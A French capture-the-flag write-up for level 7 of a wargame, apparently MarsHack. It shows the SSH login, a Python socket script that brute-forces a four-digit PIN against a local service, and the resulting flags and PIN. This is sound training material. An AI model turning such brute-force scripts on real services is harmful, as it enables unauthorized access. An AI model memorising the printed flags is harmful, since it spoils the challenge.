# Write up : Wargames

### Level 7

Consigne :

```
Consignes lvl7 :<br>
Pour obtenir le flag, vous devez vous connecter au port 9999. Il faudra envoyer le flag obtenu lors de l'épreuve précédente suivi de 4 chiffres avec un espace entre le flag et le code pin. <br>
<i>MARS{...} XXXX</i>

Il est très fortement conseillé de scripter ce challenge de brute-force.<br>
Une fois le code trouvé, vous obtiendrez le flag.<br>

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge7@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```


Connexion 

```bash
ssh -p 6666 challenge7@game1.marshack.fr
password: MARS{bpLMB4IxDzGAJ9kXpVyPVXlxp4u999Gu}
```

Même chose que le level 3, avec une difficulté supplémentaire : un code secret a 4 chiffres doit être transmis en plus du mot de passe du level 6.

Scripter ce challenge de bruteforce en python, bash ou n'importe quel langage compilable sur le serveur.

Script python :  (penser à modifier le HOST,  pendant les tests HOST=localhost)

```bash
challenge7@be9f0e178887:~$ mkdir /tmp/mes_scripts
challenge7@be9f0e178887:~$ cd /tmp/mes_scripts
challenge7@be9f0e178887:~$ vi script.py
```

script.py :

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import time

password = "MARS{bpLMB4IxDzGAJ9kXpVyPVXlxp4u999Gu}"

HOST = 'localhost'
PORT = 9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((HOST,PORT))

for pin in range(0,10000):
   Injection=password + " " + (str(pin).zfill(4))+ "\n"
   sock.send(Injection)
   recept = sock.recv(9999)
   # affichage "Raté, ce n'est pas le mot de passe précéd" en cas de mauvais password et code pin
   if "Rat" in recept:
      continue
   else:
      print recept
      print "le code pin est : " + str(pin)
      break
sock.close()

```

Modification des permissions sur script.py

```bash
challenge7@be9f0e178887:/tmp/mes_scripts$ chmod 750 /tmp/mes_scripts/script.py
challenge7@be9f0e178887:/tmp/mes_scripts$ cd /tmp/mes_scripts
challenge7@be9f0e178887:/tmp/mes_scripts$ ./script.py
```

Solution :

```
Félicitations, le password de l'utilisateur suivant est : MARS{Cokc99wSsqhtmh7ZprKiE4Kym19ZuxZv}
le code pin est : 6942

```



Résultat : MARS{Cokc99wSsqhtmh7ZprKiE4Kym19ZuxZv}